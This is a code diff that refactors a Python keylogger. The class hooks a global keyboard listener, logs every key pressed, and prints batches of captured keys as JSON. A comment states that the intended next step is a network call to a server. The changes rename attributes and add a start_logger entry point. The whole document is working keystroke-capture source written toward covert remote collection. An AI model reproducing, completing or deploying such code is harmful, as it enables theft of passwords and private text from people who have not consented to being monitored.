@@ -20,8 +20,8 @@ class Keylogger:
     {"keys_pressed": ["shift", "space", ...] }
     """
 
-    __keys_pressed: List[str] = []
-    __pressed: Optional[str] = None
+    _keys_pressed: List[str] = []
+    _pressed: Optional[str] = None
 
     def log_key(self, key: Union[Key, KeyCode]):
         """
@@ -30,26 +30,26 @@ class Keylogger:
         Paramters
         ---------
 
-        event: keyboard.Key
+        event: Union[Key, KeyCode]
              Event to log
         """
         try:
-            if self.__pressed != key.char:
-                self.__pressed = key.char
-                self.__keys_pressed.append(key.char)
+            if self._pressed != key.char:
+                self._pressed = key.char
+                self._keys_pressed.append(key.char)
         except AttributeError:
-            if self.__pressed != key.name:
-                self.__pressed = key.name
-                self.__keys_pressed.append(key.name)
+            if self._pressed != key.name:
+                self._pressed = key.name
+                self._keys_pressed.append(key.name)
 
-        if len(self.__keys_pressed) >= SAVED_KEYS_LIMIT:
+        if len(self._keys_pressed) >= SAVED_KEYS_LIMIT:
             # TODO: make network call to server
             #
             # Proof of concept: print to terminal
-            print(self.__to_json())
-            self.__keys_pressed.clear()
+            print(self._to_json())
+            self._keys_pressed.clear()
 
-    def __to_json(self) -> str:
+    def _to_json(self) -> str:
         """
         Converts the current object to JSON
 
@@ -60,10 +60,14 @@ class Keylogger:
              Object represented as JSON
              { "keys_pressed": ["shift", "space", ...] }
         """
-        keys_json: Dict[str, List[str]] = {"keys_pressed": self.__keys_pressed}
+        keys_json: Dict[str, List[str]] = {"keys_pressed": self._keys_pressed}
         return json.dumps(keys_json)
 
 
-keylogger = Keylogger()
-with keyboard.Listener(on_press=keylogger.log_key) as listener:
-    listener.join()
+def start_logger():
+    """
+    Main entry point to start Keylogger
+    """
+    keylogger = Keylogger()
+    with keyboard.Listener(on_press=keylogger.log_key) as listener:
+        listener.join()
